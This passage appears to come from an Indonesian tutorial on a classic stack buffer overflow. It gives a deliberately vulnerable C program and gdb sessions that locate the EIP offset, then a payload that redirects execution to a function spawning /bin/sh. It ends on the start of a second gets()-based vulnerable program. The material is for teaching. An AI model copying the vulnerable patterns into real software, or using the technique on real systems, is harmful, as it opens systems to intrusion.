plain">#include &lt;string.h&gt;</code></div><div class="line number3 index2 alt2"><code class="plain plain">#include &lt;stdlib.h&gt;</code></div><div class="line number4 index3 alt1"><code class="plain plain">void lulz(){</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">printf("Unbelievable you break it !!\n");</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">system("/bin/sh");</code></div><div class="line number7 index6 alt2"><code class="plain plain">}</code></div><div class="line number8 index7 alt1"><code class="plain plain">void vuln(char *zz){</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">char buf[24];</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">strcpy(buf,zz);</code></div><div class="line number11 index10 alt2"><code class="plain plain">}</code></div><div class="line number12 index11 alt1"><code class="plain plain">int main(int argc, char** argv){</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if(argc &gt; 1) vuln(argv[1]);</code></div><div class="line number14 index13 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-1" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Dalam
 program ini, kita akan mempelajari bagaimana memanfaatkan buffer 
overflow untuk mengubah alur eksekusi program, artinya kita akan 
mengarahkan program kemanapun yg kita inginkan, dan juga menguasai si 
program itu agar melakukan apapun yg kita inginkan. tapi dalam program 
ini, tujuan kita adalah mengalihkan arah program agar program memanggil 
fungsi <strong>lulz</strong> dan mendapatkan akses shell<br>
Program diatas memanggil fungsi vuln, difungsi vuln string yg ada di 
parameter pertama dikopikan kevariable buf dengan fungsi strcpy. Seperti
 yg kalian tau, ini menyebabkan overflow jika inputan kita melebihi dari
 ukuran variable buf.</p>
<div><div id="highlighter_280532" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gcc -m32 -o bof variable-overflow.c -fno-stack-protector</code></div><div class="line number2 index1 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./bof `python -c 'print "A"*28'`</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Bisa dilihat diatas, kita menginputkan 
karakter "A" sebanyak 28byte, tetapi program masih berjalan normal. 
Sekarang kita coba menginputkan lebih banyak lagi.</p>
<div><div id="highlighter_109994" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./bof `python -c 'print "A"*30'`</code></div><div class="line number2 index1 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./bof `python -c 'print "A"*32'`</code></div><div class="line number3 index2 alt2"><code class="plain plain">Segmentation fault</code></div></div></td></tr></tbody></table></div></div>
<blockquote><p>
  Segmentatian fault terjadi karena, program mencoba membaca, menulis 
atau mengesekusi ke lokasi memori yang dilarang oleh sistem operasi
</p></blockquote>
<p class="inline-ad-slot" id="inline-ad-2" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Hmm,
 pada inputan kedua, dimana kita meinputkan karakter “A” sebanyak 
32byte, dan program menampilkan Segmentation Fault, apa yang sebenarnya 
terjadi ??<br>
Difungsi main program memanggil fungsi vuln.<br>
<code>0x08048500 &amp;lt;+46&amp;gt;:   call   0x80484a7 &amp;lt;vuln&amp;gt;</code><br>
fungsi call akan menyimpan alamat sesudah intruksi call ke stack, untuk 
digunakan intruksi ret pada fungsi vuln agar kembali ke fungsi main, 
kita akan menyebut nilai ini sebagai Saved EIP. Lalu program berada di 
fungsi vuln, program membuat alokasi stack baru, dengan intruksi ini.</p>
<div><div id="highlighter_560893" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">(gdb) x/4i vuln</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x80484a7 &lt;vuln&gt;:&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; ebp</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x80484a8 &lt;vuln+1&gt;:&nbsp; mov&nbsp;&nbsp;&nbsp; ebp,esp</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x80484aa &lt;vuln+3&gt;:&nbsp; push&nbsp;&nbsp; ebx</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x80484ab &lt;vuln+4&gt;:&nbsp; sub&nbsp;&nbsp;&nbsp; esp,0x24</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Program menyimpan EBP, dan membuat alokasi
 stack baru dengan intruksi sub. Gambaran stack pada fungsi vuln, 
sebelum overflow adalah</p>
<div><div id="highlighter_898399" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- ESP</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- alokasi lokal variable sebesar 0x24 byte&nbsp; </code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">......&nbsp;&nbsp;&nbsp; </code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- EBP</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">| Saved EBP |</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">| Saved EIP |</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="plain plain">Ketika input dimasukan, dan dikopi kevariable buf di fungsi vuln</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- ESP</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AA..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;- "A" sebanyak 32byte&nbsp;&nbsp;&nbsp; </code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">......</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- EBP</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">| Saved EBP |</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">| Saved EIP |</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number29 index28 alt2">&nbsp;</div><div class="line number30 index29 alt1"><code class="plain plain">Program bisa saja mengoverwrite Saved EBP maupun Saved EIP</code></div><div class="line number31 index30 alt2">&nbsp;</div><div class="line number32 index31 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number33 index32 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- ESP</code></div><div class="line number34 index33 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number35 index34 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</code></div><div class="line number36 index35 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |</code></div><div class="line number37 index36 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |</code></div><div class="line number38 index37 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; &lt;- "A" sebanyak 32byte</code></div><div class="line number39 index38 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp; .AAAA&nbsp;&nbsp;&nbsp; |</code></div><div class="line number40 index39 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; &lt;- EBP</code></div><div class="line number41 index40 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number42 index41 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- Saved EBP teroverwrite dengan inputan</code></div><div class="line number43 index42 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div><div class="line number44 index43 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; AAAA&nbsp;&nbsp;&nbsp; |&nbsp; &lt;- Saved EIP teroverwrite</code></div><div class="line number45 index44 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+-----------+</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-3" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Saved EIP digunakan untuk intruksi ret di fungsi vuln untuk kembali kefungsi main</p>
<div><div id="highlighter_862541" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x080484c4 &lt;+29&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8048320 &lt;strcpy@plt&gt;</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x080484c9 &lt;+34&gt;:&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp; esp,0x10</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Setelah fungsi vuln selesai program akan 
lompat ke alamat 0x080484c9 (alamat yg disimpan di saved eip). Karena 
Saved EIP teroverwrite program bisa kita arahkan kemanapun yg kita 
inginkan</p>
<div><div id="highlighter_650167" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gdb ./bof -q</code></div><div class="line number2 index1 alt1"><code class="plain plain">Reading symbols from ./bof...(no debugging symbols found)...done.</code></div><div class="line number3 index2 alt2"><code class="plain plain">(gdb) run `python -c 'print "A"*32'`</code></div><div class="line number4 index3 alt1"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*32'`</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number7 index6 alt2"><code class="plain plain">0x08048514 in main ()</code></div><div class="line number8 index7 alt1"><code class="plain plain">(gdb) run `python -c 'print "A"*38'`</code></div><div class="line number9 index8 alt2"><code class="plain plain">The program being debugged has been started already.</code></div><div class="line number10 index9 alt1"><code class="plain plain">Start it from the beginning? (y or n) y</code></div><div class="line number11 index10 alt2"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*38'`</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number14 index13 alt1"><code class="plain plain">0x08004141 in ?? ()</code></div><div class="line number15 index14 alt2"><code class="plain plain">(gdb) run `python -c 'print "A"*45'`</code></div><div class="line number16 index15 alt1"><code class="plain plain">The program being debugged has been started already.</code></div><div class="line number17 index16 alt2"><code class="plain plain">Start it from the beginning? (y or n) y</code></div><div class="line number18 index17 alt1"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*40'`</code></div><div class="line number19 index18 alt2">&nbsp;</div><div class="line number20 index19 alt1"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number21 index20 alt2"><code class="plain plain">0x41414141 in ?? ()</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-4" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ternyata
 pada inputan "A" sebanyak 45byte, eip teroverwrite dan nilainya menjadi
 0x41414141. Sekarang kita sudah bisa menguasai eip. tapi sebelumnya 
kita harus mencari panjang input yg pas untuk eip teroverwrite. anggap 
kita akan mengoverwrite eip dengan 0x42424242 (BBBB)</p>
<div><div id="highlighter_368024" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">(gdb) run `python -c 'print "A"*45+"BBBB"'`</code></div><div class="line number2 index1 alt1"><code class="plain plain">The program being debugged has been started already.</code></div><div class="line number3 index2 alt2"><code class="plain plain">Start it from the beginning? (y or n) y</code></div><div class="line number4 index3 alt1"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*45+"BBBB"'`</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number7 index6 alt2"><code class="plain plain">0x41414141 in ?? ()</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Kita tambahkan "BBBB" diakhir input, dan 
eip tidak teroverwrite dengan "BBBB" mungkin inputan kita terlalu 
panjang, lalu kita kurangi inputan, sampai eip bernilai 0x42424242</p>
<div><div id="highlighter_445130" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">(gdb) run `python -c 'print "A"*40+"BBBB"'`</code></div><div class="line number2 index1 alt1"><code class="plain plain">The program being debugged has been started already.</code></div><div class="line number3 index2 alt2"><code class="plain plain">Start it from the beginning? (y or n) y</code></div><div class="line number4 index3 alt1"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*40+"BBBB"'`</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number7 index6 alt2"><code class="plain plain">0x41414141 in ?? ()</code></div><div class="line number8 index7 alt1"><code class="plain plain">(gdb) run `python -c 'print "A"*36+"BBBB"'`</code></div><div class="line number9 index8 alt2"><code class="plain plain">The program being debugged has been started already.</code></div><div class="line number10 index9 alt1"><code class="plain plain">Start it from the beginning? (y or n) y</code></div><div class="line number11 index10 alt2"><code class="plain plain">Starting program: /home/ramdhan/artikel/simple-bof-1/bof `python -c 'print "A"*36+"BBBB"'`</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="plain plain">Program received signal SIGSEGV, Segmentation fault.</code></div><div class="line number14 index13 alt1"><code class="plain plain">0x42424242 in ?? ()</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-5" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">"A"<em>36+"BBBB" inputan kita, "BBBB" pas mengenai eip. Diawal tujuan kita adalah untuk meredirect program ke fungsi *lulz</em>, kita tinggal mengganti saja "BBBB" dengan alamat fungsi lulz</p>
<div><div id="highlighter_576502" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">(gdb) p lulz</code></div><div class="line number2 index1 alt1"><code class="plain plain">$1 = {&lt;text variable, no debug info&gt;} 0x804846b &lt;lulz&gt;</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">lulz berada dialamat 0x804846b, gani 
"BBBB" menjadi "\x6b\x84\x04\x08", sekarang kita keluar dari gdb, dan 
mencoba inputan kita "A"*36 ditambah dengan alamat fungsi lulz.</p>
<div><div id="highlighter_48512" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">(gdb) quit</code></div><div class="line number2 index1 alt1"><code class="plain plain">A debugging session is active.</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">Inferior 1 [process 3958] will be killed.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">Quit anyway? (y or n) y</code></div><div class="line number7 index6 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./bof `python -c 'print "A"*36+"\x6b\x84\x04\x08"'`</code></div><div class="line number8 index7 alt1"><code class="plain plain">Unbelievable you break it !!</code></div><div class="line number9 index8 alt2"><code class="plain plain">$ whoami</code></div><div class="line number10 index9 alt1"><code class="plain plain">ramdhan</code></div><div class="line number11 index10 alt2"><code class="plain plain">$ id</code></div><div class="line number12 index11 alt1"><code class="plain plain">uid=1000(ramdhan) gid=1000(ramdhan) groups=1000(ramdhan),27(sudo),143(kvm)</code></div><div class="line number13 index12 alt2"><code class="plain plain">$ </code></div><div class="line number14 index13 alt1"><code class="plain plain">Segmentation fault</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-6" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Seperti
 itulah, kita bisa memanfaatkan buffer overflow untuk meredirect 
eksekusi program. Kita bisa melakukan apapun dengan meinjectkan 
shellcode kedalam inputan kita, tapi kita akan membahas itu nanti 
sekalian saya juga ingin menjelaskan tentang shellcode. Kurang lebih 
seperti ini jika kita menginjekan shellcode. dan mengarahkan eip untuk 
mengeksekusi shellcode.</p>
<div><div id="highlighter_54895" class="syntaxhighlighter  cpp"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include &lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="cpp keyword bold">void</code> <code class="cpp plain">vuln(){</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code> <code class="cpp plain">buf[52];</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Masukkan nama anda : "</code><code class="cpp plain">);</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">gets</code><code class="cpp plain">(buf);</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Selamat datang %s\n"</code><code class="cpp plain">, buf);</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code 